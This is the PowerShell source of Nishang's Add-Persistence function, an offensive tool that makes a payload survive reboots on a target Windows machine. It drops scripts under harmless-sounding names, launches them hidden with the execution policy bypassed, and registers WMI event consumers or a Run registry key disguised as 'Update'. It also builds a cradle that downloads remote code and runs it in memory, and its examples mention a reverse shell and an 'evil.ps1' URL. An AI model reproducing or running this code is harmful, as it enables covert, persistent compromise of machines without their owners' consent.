
function Add-Persistence
{
<#
.SYNOPSIS
Nishang script which could be used to make execution of a PowerShell script from disk or URL reboot persistent using WMI permannet event consumer.

.DESCRIPTION
This script accepts path of a script or URL which is then executed on every reboot persistently.
In case the PayloadScript parameter is used, the target sript is dropped into the current user's profile\AppData\Local\Microsoft directory 
and either WMI permanent event consumer or Registry changes is used (based on privs) for persistence.

When the PayloadURL parameter is used, the target script is downloaded and executed in memory on every run,

Persistence created using this script could be cleaned by using the Remove-Persistence.ps1 script in Nishang.

.PARAMETER PayloadURL
URL of the PowerShell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER PayloadScript
Path to a PowerShell script on the target machine.
Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.

.PARAMETER VBFileName
Name of the VBScript file to be dropped on the target in case payloadscript parameter is used. 
Default is WindowsSanity.vbs

.PARAMETER PSFileName
Name of the PowerShell script/payload to be dropped on the target in case payloadscript parameter is used. 
Default is WindowsSanity.ps1

.PARAMETER filterName
Name of the Event Filter to be create on the target. Default is WindowsSanity

.Example
PS > Add-Persistence -ScriptPath C:\test\Invoke-PowerShellTcpOneLine.ps1
Use the above to drop the reverse shell PowerShell script and WindowsSanity.vbs on the target box. The VBscript file and thus the 
PoWerShell payload will be executed on every reboot. Please note that C:\test\Invoke-PowerShellTcpOneLine.ps1 is the path on the target machine. 

.EXAMPLE
PS > Add-Persistence -PayloadURL http://yourwebserver/evil.ps1
Use the above to download and execute in memory the evil.ps1 script everytime the target machine reboots. 

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>    
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadScript,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $VBFileName = "SanityCheck.vbs",

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $PSFileName = "SanityCheck.ps1",

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $filterName = "WindowsSanity"
    )
    
    if ($PayloadScript)
    {
        $body = Get-Content $PayloadScript
    }

    #Write PowerShell script to disk
    $PayloadFile = "$env:USERPROFILE\AppData\Local\Microsoft\$PSFileName"
    Write-Verbose "Writing payload to $PayloadFile"
    Out-File -InputObject $body -Force $PayloadFile

    $VBSFile = "$env:USERPROFILE\AppData\Local\Microsoft\$VBFileName"
    Write-Verbose "Writing VBScript to $VBSFile"
    $VBSCode1 = "Set objShell = CreateObject(""Wscript.shell"")"
    $VBSCode2 = "objShell.run(""powershell -WindowStyle Hidden -executionpolicy bypass -file $PayloadFile"")"
    $VBSCode = $VBSCode1 + ":" + $VBSCode2
    Out-File -InputObject $VBSCode -Force $VBSFile

    #Make a payload from PayloadURL
    $Payload = "powershell -w Hidden -nop IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"

    $filterNS = "root\cimv2"
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        if ($PayloadScript)
        {     
            # Query taken from Matt's code in PowerSploit.
            Write-Verbose "Creating reboot persistence. The payload executes on every computer restart"
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        
            Write-Verbose "Creating a filter with name $filtername for executing $VBSFile."
            $filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{name=$filterName; ScriptFileName=$VBSFile; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        elseif ($PayloadURL)
        {
            Write-Verbose "Creating reboot persistence. The payload executes on every computer restart"
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        
            Write-Verbose "Creating a filter with name $filtername for executing script in memory from $PayloadURL"
            $filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{name=$filterName; CommandLineTemplate = $Payload}
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null

        }
        else
        {
            Write-Warning "Please specify a payload script or URL!"
        }
    }
    else
    {        
        Write-Verbose "Not running with elevated privileges. Using RUn regsitry key"\
        if ($PayloadScript)
        {
            New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $VBSFile -force
        }
        elseif ($PayloadURL)
        {
            New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $Payload -force
        }
        else
        {
            Write-Warning "Please specify a payload script or URL!"
        }
    }
}



